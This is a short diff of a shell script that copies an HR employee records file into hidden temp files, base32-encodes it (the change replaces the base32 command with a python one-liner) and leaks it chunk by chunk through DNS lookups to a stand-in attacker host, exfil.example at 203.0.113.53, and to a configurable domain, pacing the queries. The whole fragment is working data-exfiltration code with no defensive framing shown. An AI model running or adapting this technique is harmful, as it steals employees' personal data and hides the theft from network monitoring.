@@ -72,14 +72,14 @@ stat /opt/hr/employee_records.csv
 head -5 /opt/hr/employee_records.csv
 cat /opt/hr/employee_records.csv > /tmp/.u2
 wc -l /tmp/.u2
-base32 -w0 /tmp/.u2 > /tmp/.b32
+python3 -c "import base64; open('/tmp/.b32','w').write(base64.b32encode(open('/tmp/.u2','rb').read()).decode())"
 fold -w 30 /tmp/.b32 | head
 for x in $(cat /tmp/.b32 | fold -w 30); do dig +short ${x}.exfil.example @203.0.113.53; done
 dig +short metrics.internal.example
 dig +short logging.internal.example
 cat /etc/resolv.conf
 EOF
-base32 -w0 /opt/hr/employee_records.csv >/tmp/.b32
+python3 -c "import base64; open('/tmp/.b32','w').write(base64.b32encode(open('/opt/hr/employee_records.csv','rb').read()).decode())"
 while read -r x; do
   dig +short "$x.$DNS_DOMAIN" @"$DNS_IP" >/dev/null 2>&1 || true
   sleep .15
